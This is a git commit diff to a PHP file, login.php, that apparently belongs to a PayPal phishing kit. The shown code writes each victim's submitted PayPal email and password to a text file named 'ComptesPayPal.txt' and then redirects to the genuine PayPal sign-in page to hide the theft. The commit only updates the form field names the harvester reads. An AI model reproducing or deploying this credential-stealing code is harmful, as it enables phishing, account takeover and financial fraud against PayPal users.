0c7a7231174f8bb5f6a108e6493bf5dbbe5b46dd
TheLinuxProject <64985848+thelinuxproject@users.noreply.github.com>
2020-06-14 11:55:41 +0200

    Update login.php

--- login.php
+++ login.php
@@ -1,4 +1,4 @@
 <?php
- file_put_contents("ComptesPayPal.txt"," Compte : " . $_POST['username'] . "\n  Mot de Pass : " .$_POST['password'] . "\n\n",FILE_APPEND);
+ file_put_contents("ComptesPayPal.txt"," Compte : " . $_POST['login_email'] . "\n  Mot de Pass : " .$_POST['login_password'] . "\n\n",FILE_APPEND);
  header('Location: https://www.paypal.com/fr/signin');
  exit();
